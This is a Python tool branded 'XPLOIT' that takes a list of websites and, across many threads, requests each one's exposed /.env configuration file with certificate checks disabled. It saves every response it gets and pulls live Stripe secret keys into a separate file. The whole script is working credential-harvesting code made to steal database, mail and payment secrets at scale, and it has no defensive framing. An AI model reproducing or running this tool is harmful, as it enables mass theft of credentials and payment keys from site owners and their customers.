import re
import sys
import os
import time
import socket
import urllib3
import smtplib
import os.path
import requests
from os import path
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests

os.system('clear || cls')

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LBLUE = '\033[38;2;66;165;245m'
    GREY = '\033[38;2;158;158;158m'
    
class Bot:
    def envScanner(self, url):
       en = True
       con = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=','sk_live', 'APP_ENV=']
       try:
          urx = f'http://{url}/.env'
          r = requests.get(urx, verify=False, timeout=6, allow_redirects=False)
          if r.status_code ==200:
             en = False
             resp = r.text
             with open(os.path.join('ENVS', f'{url}_env.txt'), 'a+') as output:
                output.write(f'{resp}\n')
             if any(key in resp for key in con):
                print(xcol.LGREEN+"[ENVIRONMENT] : "+xcol.RESET+urx);
                lin = resp.splitlines( )
                for x in lin:
                   if "sk_live" in x:
                      file_object = open('SK_LIVE.TXT', 'a')
                      file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                      file_object.close()
             else:
                try:
                   urx = f'https://{url}/.env'
                   r = requests.get(urx, verify=False, timeout=6, allow_redirects=False)
                   if r.status_code ==200:
                    resp = r.text
                    with open(os.path.join('ENVS', f'{url}_env.txt'), 'a+') as output:
                       output.write(f'{resp}\n')
                    if any(key in resp for key in con):
                       print(xcol.LGREEN+"[ENVIRONMENT] : "+xcol.RESET+urx);
                       lin = resp.splitlines( )
                       for x in lin:
                          if "sk_live" in x:
                             file_object = open('SK_LIVE.TXT', 'a')
                             file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                             file_object.close()
                    else:
                       print(xcol.LRED+"[ENVIRONMENT] : "+xcol.RESET+urx)
                except:
                   print("[ ERR ] : ")
          else:
              try:
                 urx = f'https://{url}/.env'
                 r = requests.get(urx, verify=False, timeout=6, allow_redirects=False)
                 if r.status_code ==200:
                    resp = r.text
                    with open(os.path.join('ENVS', f'{url}_env.txt'), 'a+') as output:
                       output.write(f'{resp}\n')
                    if any(key in resp for key in con):
                       print(xcol.LGREEN+"[ENVIRONMENT] : "+xcol.RESET+urx);
                       lin = resp.splitlines( )
                       for x in lin:
                          if "sk_live" in x:
                             file_object = open('SK_LIVE.TXT', 'a')
                             file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                             file_object.close()
                 else:
                    print(xcol.LRED+"[ENVIRONMENT] : "+xcol.RESET+urx)
              except:
                 print(xcol.LRED+"[ENVIRONMENT] : "+xcol.RESET+urx)
       except :
          print(xcol.LRED+"[ENVIRONMENT] : "+xcol.RESET+urx)
       

if __name__ == '__main__':
    os.system('clear')
    print(""" \033[38;2;158;158;158m
  ██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗████████╗
  ╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝
  ░╚███╔╝░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░
  ░██╔██╗░██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░
  ██╔╝╚██╗██║░░░░░███████╗╚█████╔╝██║░░░██║░░░
  ╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░

  Version : 1.0 (BETA)
  \u001B[0m
  """)
    if not os.path.isdir("ENVS"): 
       os.makedirs("ENVS") 
    while(True):
        thrd = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
        inp = 5
        if inp == 5:
            inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
            threads = []
            with open(inpFile) as urlList:
                argFile = urlList.read().splitlines()
            with ThreadPoolExecutor(max_workers=thrd) as executor:
                for data in argFile:
                    threads.append(executor.submit(Bot().envScanner, data))
            quit()